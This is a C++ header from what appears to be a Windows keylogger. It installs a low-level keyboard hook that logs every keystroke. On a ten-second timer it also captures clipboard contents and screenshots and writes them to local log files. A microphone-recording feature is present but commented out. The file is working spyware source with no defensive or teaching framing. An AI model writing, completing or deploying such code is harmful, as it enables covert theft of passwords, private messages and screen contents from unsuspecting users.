#ifndef __KEYBTNHOOK_H
#define __KEYBTNHOOK_H

#include"Keys.h"
#include"Helper.h"
#include"Timer.h"
#include"Additional.h"

std::string keylog = "";
std::string clipboardlog = "";
int counter = 0;
void TimerForProcess() {
	Additional AOBJ;
	Helper HOBJ;
	// Additional::Clipboard
	clipboardlog = AOBJ.GetClipboard();
	if (!(clipboardlog == ""))
	{
		//Write Clipboard Data to File and empty the clipboardlog variable
		bool checkClipWrite = HOBJ.WriteToFile(clipboardlog, "clipboardlog.txt");
		if (checkClipWrite)
			clipboardlog = "";
	}

	////Additional::Microphone recording
	//counter += 1;
	//if (counter == 1) {
	//	AOBJ.recordingMicrophoneStart();
	//}
	//else if (counter == 2) {
	//	AOBJ.recordingMicrophoneStop();
	//	counter = 0;
	//}

	// Additional::Screenshot
	AOBJ.Screenshot();

	// Log Write to File
	Sleep(1000);
	bool checkLogFileWrite = HOBJ.WriteToFile(keylog, "log.txt");
	if (checkLogFileWrite)
		keylog = "";
}

Timer timer(TimerForProcess, 10000 , Timer::Infinite);

// Hook for keyboard BUTTON Presses
HHOOK eHook = NULL;

LRESULT CALLBACK OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
	if (nCode < 0)
		CallNextHookEx(eHook, nCode, wparam, lparam);
	PKBDLLHOOKSTRUCT kbs = (PKBDLLHOOKSTRUCT)lparam;

	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
	{
		keylog += Keys::KEYS[kbs->vkCode].Name;
		if (kbs->vkCode == VK_RETURN)
			keylog += '\n';
	}
	else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
	{
		DWORD key = kbs->vkCode;
		if (key == VK_CONTROL
			|| key == VK_LCONTROL
			|| key == VK_RCONTROL
			|| key == VK_SHIFT
			|| key == VK_RSHIFT
			|| key == VK_LSHIFT
			|| key == VK_MENU
			|| key == VK_LMENU
			|| key == VK_RMENU
			|| key == VK_CAPITAL
			|| key == VK_NUMLOCK
			|| key == VK_LWIN
			|| key == VK_RWIN
			)
		{
			std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
			KeyName.insert(1, "/");
			keylog += KeyName;
		}
	}
	
	return CallNextHookEx(eHook, nCode, wparam, lparam);
}


bool InstallHook()
{

	timer.Start(true);
	eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc,
							 GetModuleHandle(NULL), 0);
	std::cout << "eHook=" << eHook << std::endl;
	return eHook == NULL;
}

bool UninstallHook()
{
	BOOL b = UnhookWindowsHookEx(eHook);
	eHook = NULL;
	return (bool)b;
}

bool IsHooked()
{
	return (bool)(eHook == NULL);
}

#endif // !__KEYBTNHOOK_H
